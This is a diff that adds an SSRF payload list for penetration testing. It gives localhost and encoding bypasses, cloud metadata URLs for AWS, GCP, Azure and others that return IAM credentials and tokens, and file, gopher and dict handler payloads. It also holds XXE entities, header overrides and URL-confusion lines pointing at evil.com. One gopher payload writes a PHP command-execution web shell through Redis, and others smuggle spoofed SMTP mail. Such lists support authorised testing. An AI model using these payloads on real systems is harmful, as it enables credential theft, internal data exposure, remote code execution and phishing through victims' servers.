@@ -1,0 +1,270 @@
+# Enhanced SSRF (Server-Side Request Forgery) Payloads
+# Author: Abdulrahman Muhammad (0xLegacy)
+# Contains payloads for discovering internal services, bypass techniques, and cloud metadata access
+
+# IPv4 localhost variants
+127.0.0.1
+127.0.0.2
+127.1
+127.0.1
+0
+0.0.0.0
+localhost
+[::]
+[::1]
+2130706433
+0177.0000.0000.0001
+0x7f000001
+2130706433
+
+# IPv4 private ranges
+10.0.0.1
+10.0.0.0/8
+172.16.0.1
+172.16.0.0/12
+192.168.0.1
+192.168.0.0/16
+169.254.169.254
+fd00::/8
+
+# DNS rebinding
+mysub.burpcollaborator.net
+attacker-domain.com
+
+# SSRF Scanner Tool
+internal-scan.local
+
+# HTTP Basic Auth for port scanning
+http://username:password@127.0.0.1:22/
+http://username:password@127.0.0.1:3306/
+
+# DNS spoofing for bypass
+attacker_controlled_server.com
+
+# URL encoding bypass
+http://127.0.0.1/%2561dmin
+http://%32%37%2E%30%2E%30%2E%31
+http://127.0.0.1/internal-only/app
+
+# Double URL encoding bypass
+http://127.0.0.1/%25%36%31dmin
+http://%25%33%32%25%33%37%25%32%45%25%33%30%25%32%45%25%33%30%25%32%45%25%33%31
+
+# CRLF for SSRF chaining
+127.0.0.1:25?%0d%0aHELO%20test%0d%0aMAIL%20FROM%3A%3Ctest%40test.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40victim.com%3E%0d%0aDATA%0d%0aFrom%3A%20%3Ctest%40test.com%3E%0d%0aTo%3A%20%3Cvictim%40victim.com%3E%0d%0aSubject%3A%20test%0d%0aSSRF%20test%0d%0a%2E%0d%0aQUIT%0d%0a
+
+# Protocol handler exploits
+file:///etc/passwd
+file://c:/windows/win.ini
+gopher://127.0.0.1:25/xHELO%20localhost
+dict://127.0.0.1:11211/stat
+sftp://evil.com:11111/
+ldap://127.0.0.1:389/%0astats
+tftp://evil.com:12346/TESTUDPPACKET
+smtp://localhost:25/
+jar://127.0.0.1:1337/test.class
+
+# AWS EC2 Metadata Service
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+
+# GCP Metadata Service
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
+http://metadata.google.internal/computeMetadata/v1/instance/disks/
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+
+# Google's metadata header bypass
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes?alt=json
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true&alt=json
+
+# Azure metadata service
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+http://169.254.169.254/metadata/instance/compute/osType?api-version=2017-04-02&format=text
+http://169.254.169.254/metadata/instance/compute/location?api-version=2017-04-02&format=text
+http://169.254.169.254/metadata/instance/compute?api-version=2017-04-02
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Oracle Cloud
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/instance/metadata/
+http://169.254.169.254/opc/v1/identity/cert.pem
+http://169.254.169.254/opc/v1/identity/key.pem
+http://169.254.169.254/opc/v1/identity/intermediate.pem
+http://169.254.169.254/opc/v1/vnic/
+
+# Digital Ocean
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+
+# Tencent Cloud
+http://metadata.tencentyun.com/latest/meta-data/
+http://metadata.tencentyun.com/latest/meta-data/instance-id
+http://metadata.tencentyun.com/latest/meta-data/local-ipv4
+
+# Kubernetes / OpenShift
+https://kubernetes.default.svc
+https://kubernetes.default
+https://kubernetes
+https://kubernetes.default.svc.cluster.local
+https://openshift.default.svc
+https://openshift.default
+https://openshift
+https://api
+https://api.kubernetes
+
+# Kubernetes default service tokens
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# DNS rebinding with domain fronting
+dynamic-dns-attacker.com
+
+# Local network devices / services
+http://192.168.0.1/
+http://192.168.1.1/
+http://router.local/
+http://admin.local/
+http://printer.local:631/
+http://10.0.0.1/
+http://172.16.0.1/
+http://raspberrypi.local/
+http://nas.local/
+
+# Docker internals
+http://host.docker.internal
+http://docker.for.mac.localhost
+http://docker.for.win.localhost
+unix:///var/run/docker.sock
+
+# UNC paths (Windows)
+file:////c:/windows/system32/drivers/etc/hosts
+file:////localhost/c$/windows/win.ini
+\\localhost\c$\windows\system32\drivers\etc\hosts
+file:///\\localhost\c$\windows\win.ini
+
+# URL parser confusion
+http://127.0.0.1#@evil.com
+http://127.0.0.1?@evil.com
+http://127.0.0.1%23@evil.com
+http://127.0.0.1%3F@evil.com
+
+# IPv6 bypass
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+# Protocol smuggling
+gopher://127.0.0.1:25/1%0D%0AHELO%20localhost%0D%0AMAIL%20FROM%3A%3Cbad%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40victim.com%3E%0D%0ADATA%0D%0AFrom%3A%20%3Clegit%40legit.com%3E%0D%0ATo%3A%20%3Cvictim%40victim.com%3E%0D%0ASubject%3A%20Important%20Security%20Update%0D%0A%0D%0AThis%20is%20an%20important%20message%20about%20security%21%0D%0A%2E%0D%0AQUIT%0D%0A
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+
+# Blind SSRF/time-based confirmation
+https://some-inexistent-website.com/
+https://www.google.com:11211/
+
+# Common internal Jenkins instance paths
+http://localhost:8080/api/json
+http://jenkins.internal:8080/
+http://admin:admin@jenkins.internal:8080/script
+
+# Elasticsearch
+http://localhost:9200/_search?q=
+http://localhost:9200/_cluster/state
+http://localhost:9200/_cat/indices
+http://127.0.0.1:9200/_all/_search
+
+# Memcached
+dict://localhost:11211/stats
+gopher://localhost:11211/stats
+
+# Redis
+redis://localhost:6379/info
+dict://localhost:6379/info
+gopher://localhost:6379/_info
+
+# MongoDB
+mongodb://localhost:27017/admin
+mongodb://localhost:27017/test
+gopher://localhost:27017/_
+
+# Internal Prometheus metrics
+http://localhost:9090/metrics
+http://localhost:9100/metrics
+http://localhost:3000/metrics
+
+# Common service paths
+http://127.0.0.1:8888/api/
+http://127.0.0.1:8181/actuator/env
+http://127.0.0.1:8080/actuator/health
+http://127.0.0.1:8080/swagger-ui.html
+http://127.0.0.1:4040/api/tunnels
+http://127.0.0.1:15672/
+http://127.0.0.1:5601/app/kibana
+http://127.0.0.1:8081/config
+http://127.0.0.1:8649/
+
+# Common headers to pass metadata service requirements
+X-Forwarded-For: 169.254.169.254
+Metadata-Flavor: Google
+X-Google-Metadata-Request: True
+X-Metadata-Flavor: Google
+X-Meta-Config-Flavor: Google
+
+# Bypass in URL path
+https://example.com/?page=http://127.0.0.1
+https://example.com/?page=http%3A%2F%2F127.0.0.1%2Fadmin
+https://example.com/?url=http://127.0.0.1:22
+https://example.com/url=file:///etc/passwd
+https://example.com/?path=file:///etc/passwd
+
+# JSON POST data bypass
+{"url":"http://127.0.0.1/admin"}
+{"path":"file:///etc/passwd"}
+{"uri":"ssrf://127.0.0.1:3306"}
+
+# XML bypass
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/private" >]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+# Host header SSRF
+Host: 127.0.0.1
+Host: internal.company.local
+
+# Cache poisoning
+X-Forwarded-Host: 127.0.0.1
+Forwarded: for=127.0.0.1;host=127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Server: 127.0.0.1
+X-HTTP-Host-Override: 127.0.0.1
+X-Forwarded-Proto: http
+X-Original-URL: http://127.0.0.1
+X-Override-URL: http://127.0.0.1
+
+# Blind SSRF callback canaries with burp collaborator
+http://UNIQUEID.burpcollaborator.net
+http://localhost.UNIQUEID.burpcollaborator.net
+http://customer1.app.UNIQUEID.burpcollaborator.net
